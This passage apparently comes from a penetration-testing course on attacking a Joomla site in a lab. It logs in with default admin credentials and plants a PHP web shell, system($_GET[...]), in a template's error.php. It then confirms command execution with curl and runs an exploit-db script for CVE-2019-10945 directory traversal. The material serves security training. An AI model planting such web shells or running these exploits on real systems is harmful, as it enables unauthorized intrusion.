
---

We now know that we are dealing with a Joomla e-commerce site. If we can gain access, we may be able to land in the client's internal environment and begin enumerating the internal domain environment.  It is possible to gain remote code execution if we can log in to the admin backend.

Using the credentials that we obtained in the examples from the last section, `admin:admin`, let's log in to the target backend at `http://dev.inlanefreight.local/administrator`. For our purposes, we would like to add a snippet of PHP code to gain RCE. We can do this by customizing a template.

If you receive an error stating "An error has occurred. Call to a member function format() on null" after logging in, navigate to "http://dev.inlanefreight.local/administrator/index.php?option=com_plugins" and disable the "Quick Icon - PHP Version Check" plugin. This will allow the control panel to display properly.

From here, we can click on `Templates` on the bottom left under `Configuration` to pull up the templates menu.

Next, we can click on a template name. Let's choose `protostar` under the `Template` column header. This will bring us to the `Templates: Customise` page.

Finally, we can click on a page to pull up the page source. It is a good idea to get in the habit of using non-standard file names and parameters for our web shells to not make them easily accessible to a "drive-by" attacker during the assessment.

We can also password protect and even limit access down to our source IP address. Also, we must always remember to clean up web shells as soon as we are done with them but still include the file name, file hash, and location in our final report to the client.

Let's choose the `error.php` page. We'll add a PHP one-liner to gain code execution as follows.
        php
`system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);`

Once this is in, click on Save & Close at the top and confirm code execution using cURL.

```
        shellsession
tylapcheong@htb[/htb]$ curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Leveraging Known Vulnerabilities

At the time of writing, there have been [426](https://www.cvedetails.com/vulnerability-list/vendor_id-3496/Joomla.html) Joomla-related vulnerabilities that received CVEs. However, just because a vulnerability was disclosed and received a CVE does not mean that it is exploitable or a working public PoC exploit is available. Searching a site such as `exploit-db` shows over 1,400 entries for Joomla, with the vast majority being for Joomla extensions.

Let's dig into a Joomla core vulnerability that affects version `3.9.4`, which our target `http://dev.inlanefreight.local/` was found to be running during our enumeration. Checking the Joomla [downloads](https://www.joomla.org/announcements/release-news/5761-joomla-3-9-4-release.html) page, we can see that `3.9.4` was released in March of 2019. Researching a bit, we find that this version of Joomla is likely vulnerable to [CVE-2019-10945](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945) which is a directory traversal and authenticated file deletion vulnerability. We can use [this](https://www.exploit-db.com/exploits/46710) exploit script to leverage the vulnerability and list the contents of the webroot and other directories.

```
tylapcheong@htb[/htb]$ python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
```